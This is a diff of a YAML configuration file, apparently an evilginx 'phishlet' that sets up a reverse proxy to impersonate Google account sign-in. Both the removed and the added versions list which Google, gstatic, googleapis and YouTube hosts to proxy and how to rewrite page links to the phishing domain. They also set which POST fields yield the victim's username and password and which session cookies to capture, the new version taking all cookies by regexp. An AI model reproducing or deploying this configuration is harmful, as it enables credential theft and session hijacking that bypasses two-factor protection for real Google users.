@@ -1,37 +1,70 @@
-name: 'google'
-author: 'kgretzky'
-min_ver: '2.4.0'
-
+author: '@hash3liZer'
+min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true}
-  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false,}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+  
+  - {phish_sub: 'youtube', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false, auto_filter: false}
 
 sub_filters:
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'href="https://accounts.google.com', replace: 'href="https://{hostname}', mimes: ['text/html'], redirect: true}
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'action="https://accounts.google.com', replace: 'action="https://{hostname}', mimes: ['text/html'], redirect: true}
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com/_/scs/abc-static', replace: 'https://{hostname}/_/scs/abc-static', mimes: ['text/html'], redirect: false}
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://ssl.gstatic.com', replace: 'https://{hostname_starts_with: ssl}.gstatic.com', mimes: ['text/html'], redirect: false}
-  - {triggers_on: 'ssl.gstatic.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '/', replace: '', mimes: ['image/jpeg', 'image/png', 'image/svg+xml', 'text/css'], redirect: true}
+  - {triggers_on: 'apis.google.com', orig_sub: 'apis', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
 
-credentials:
-  username:
-    key: 'identifier'
-    search: '.*'
-    type: 'post'
-  password:
-    key: 'password'
-    search: '.*'
-    type: 'post'
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'play', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'content', domain: 'googleapis.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
 
 auth_tokens:
   - domain: '.google.com'
-    keys: ['SID','HSID','SSID','APISID','SAPISID','SIDCC','__Secure-1PSID','__Secure-3PSID','__Secure-1PSIDCC','__Secure-3PSIDCC','__Secure-1PSIDTS','__Secure-3PSIDTS','LSID','SMSV','gtm','OTZ','NID','1P_JAR']
-
+    keys: [".*,regexp"]
+  - domain: 'accounts.google.com'
+    keys: [".*,regexp"]
+  - domain: 'accounts.google.bg'
+    keys: [".*,regexp"]
+credentials:
+  username:
+    key: 'f.req'
+    search: '\],"([^"]*)"\]$'
+    type: 'post'
+  password:
+    key: 'f.req'
+    search: ',\["([^"]*)",'
+    type: 'post'
+  custom:
+    - key: 'useragent'
+      search: '(.*)'
+      type: 'post'
+    - key: 'browser'
+      search: '(.*)'
+      type: 'post'
+    - key: 'engine'
+      search: '(.*)'
+      type: 'post'
+    - key: 'platform'
+      search: '(.*)'
+      type: 'post'
 auth_urls:
-  - '/accounts/SetSID'
-  - '/accounts/SetOSID'
-
-login_urls:
-  - 'https://{hostname}/accounts/Login'
-  - 'https://{hostname}/v3/signin/identifier'
-  - 'https://{hostname}/v3/signin/challenge/pwd'
+  - '/CheckCookie'
+  - '/ManageAccount'
+login:
+  domain: 'accounts.google.com'
+  path : '/ServiceLogin'
+force_post:
+  - path: '/_/signin/sl/challenge'
+    search: 
+      - {key: 'f.req', search: '.*'}
+      - {key: 'continue', search: '.*'}
+    force:
+      - {key: 'continue', value: ''}
+    type: 'post'
